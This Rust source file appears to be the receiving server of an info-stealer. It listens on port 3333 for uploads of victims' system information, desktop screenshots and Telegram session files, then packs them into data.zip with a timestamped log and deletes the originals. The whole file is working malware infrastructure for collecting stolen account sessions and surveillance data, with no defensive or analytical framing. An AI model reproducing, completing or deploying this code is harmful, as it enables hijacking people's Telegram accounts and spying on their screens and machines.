pub mod time_md
{
	// PACKAGES
	use std::process::Command;


	fn del_newline(s: &mut String)
	{
		if s.ends_with('\n') || s.ends_with('\r') { s.pop();
			if s.ends_with('\r') || s.ends_with('\n') { s.pop();
				if s.ends_with(' ') { s.pop(); } } }
	} 


	fn get_date() -> String
	{
		let foo = if cfg!(target_os = "windows") {
			Command::new("cmd")
				.args(["/C", "DATE /t"])
				.output().expect("failed to execute process")
		} else {
			Command::new("sh")
				.args(["-c", "date +'%e.%m.%Y'"])
				.output().expect("failed to execute process")
		};

		let mut new_str = String::from_utf8(foo.stdout.clone()).unwrap();

		del_newline(&mut new_str);

		new_str
	}


	fn get_time() -> String
	{
		let foo = if cfg!(target_os = "windows") {
			Command::new("cmd")
				.args(["/C", "TIME /t"])
				.output().expect("failed to execute process")
		} else {
			Command::new("sh")
				.args(["-c", "date +'%H.%M.%S'"])
				.output().expect("failed to execute process")
		};

		let mut new_str = String::from_utf8(foo.stdout.clone()).unwrap();

		del_newline(&mut new_str);

		new_str
	}

	pub fn start() -> [String; 2] {
		let res: [String; 2] = [get_date(), get_time()];
		return res;
	}
}

pub mod log_md
{
	use std::io::Result;
	use std::fs::File;
	use std::fs::OpenOptions;
	use std::io::{Read, Write};


	fn add_new_line(filename: String, text: String) -> Result<()> {
		let mut existing_content = String::new();
		match OpenOptions::new().read(true).open(&filename) {
			Ok(mut file) => {
				file.read_to_string(&mut existing_content)?;
			}
			Err(_) => {}
		}

		let updated_content = format!("{}{}\n", existing_content, text);

		let mut file = OpenOptions::new()
			.write(true)
			.create(true)
			.truncate(true)
			.open(filename)?;

		file.write_all(updated_content.as_bytes())?;

		Ok(())
	}


	pub fn start(x: String)
	{
		let date: [String; 2] = crate::server::time_md::start();
		let text = format!("{} | {} - {}", x, date[0], date[1]);

		add_new_line("log.txt".to_string(), text);
	}
}

pub mod zip_md
{
	// PACKAGES
	use std::fs;
	use std::fs::File;
	use std::path::Path;
	use zip::write::FileOptions;
	use zip::write::ZipWriter;
	use std::io::BufWriter;


	pub fn start() -> std::io::Result<()>
	{
		let file = File::create("data.zip")?;
		let mut zip = ZipWriter::new(file);

		// CREATE OPTIONS FOR THE ZIP FILE (COMPRESSION LEVEL & OTHER OPTIONS)
		let options = FileOptions::default()
			.compression_method(zip::CompressionMethod::Stored) // NO COMPRESSION
			.unix_permissions(0o755);

		//ADDS A OS-INFO TO THE ZIP FOLDER
		{
			zip.start_file("sysinfo.txt", options)?;
			let mut file_content = File::open("sysinfo.txt")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_file("sysinfo.txt");
		}

		//ADDS A DESKTOP'S SCREENSHOT TO THE ZIP FOLDER
		{
			zip.start_file("screen-1.png", options)?;
			let mut file_content = File::open("screen-1.png")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_file("screen-1.png");
		}

		// ADDS A FOLDER WHICH CONTAIN TELEGRAM'S SESSIONS
		{
			zip.add_directory("tg-session", FileOptions::default())?;
			zip.start_file("tg-session/received_file", options)?;
			let mut file_content = File::open("tg-session/received_file")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_dir_all("tg-session");
		}

		//ADDS A LOG-INFO TO THE ZIP FOLDER
		{
			crate::server::log_md::start("zip created".to_string());
			zip.start_file("log.txt", options)?;
			let mut file_content = File::open("log.txt")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_file("log.txt");
		}


		zip.finish()?;
		println!("zip folder created successfully.");
		Ok(())
	}
}

pub mod server_md
{
	// PACKAGES
	use std::thread;
	use std::net::{TcpListener, TcpStream, Shutdown};
	use std::io::{self, Read, Write};
	use std::fs::File;
	use std::path::Path;
	use std::io::Result;
	use std::fs;


	fn handle_client(mut stream: TcpStream) -> Result<()>
	{
		let mut buffer = [0; 1024];
		stream.read(&mut buffer).unwrap();
		let request = String::from_utf8_lossy(&buffer[..]);


		match request.lines().next() {
			Some(line) if line.starts_with("GET /sysinfo") => {
				match stream.read(&mut buffer) {
					Ok(x) =>
					{
						let resp = String::from_utf8_lossy(&buffer[..x]);
						let mut file = File::create("sysinfo.txt")?;
						file.write_all(resp.as_bytes())?;

						crate::server::log_md::start("#sysinfo".to_string());
					},
					Err(_) => println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap()),
				}

				println!("HTTP/1.1 200 OK");
			},
			Some(line) if line.starts_with("GET /screen") => {
				let mut buf = Vec::new();
				let x = stream.read_to_end(&mut buf).expect("FAILED TO READ FROM CLIENT");

				let mut photo: Vec<u8> = Vec::new();
				photo.extend_from_slice(&buf[..x]);
				fs::write("screen-1.png", photo).unwrap();

				crate::server::log_md::start("#screen".to_string());
				println!("HTTP/1.1 200 OK");
			},
			Some(line) if line.starts_with("GET /session") => {
				let mut received_bytes = 0;
				let path = Path::new("tg-session");
				if !path.exists() { fs::create_dir(&path)?; }

				loop
				{
					let bytes_read = stream.read(&mut buffer)?;
					if bytes_read == 0 { break; }

					let received_data = &buffer[..bytes_read];
					received_bytes += bytes_read;
					let mut file = fs::OpenOptions::new().write(true).append(true).create(true).open(path.join("received_file"))?;

					file.write_all(received_data)?;
				}

				println!("HTTP/1.1 200 OK");

				crate::server::log_md::start("#session".to_string());
				crate::server::zip_md::start();
			},
			_ => println!("HTTP/1.1 404 NOT FOUND"),
		};		

		stream.flush().unwrap();
		Ok(())
	}

	pub fn server_fn()
	{
		let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
		
		println!("Server listening on port 3333");
		crate::server::log_md::start("server started".to_string());

		for stream in listener.incoming()
		{
			match stream {
				Ok(stream) => {
					println!("New connection: {}", stream.peer_addr().unwrap());
					thread::spawn(move|| {
						crate::server::log_md::start(format!("new connection: {}", stream.peer_addr().unwrap()));
						handle_client(stream);
					});
				}
				Err(e) => { println!("Error: {}", e); }
			}
		}

		drop(listener);
	}
}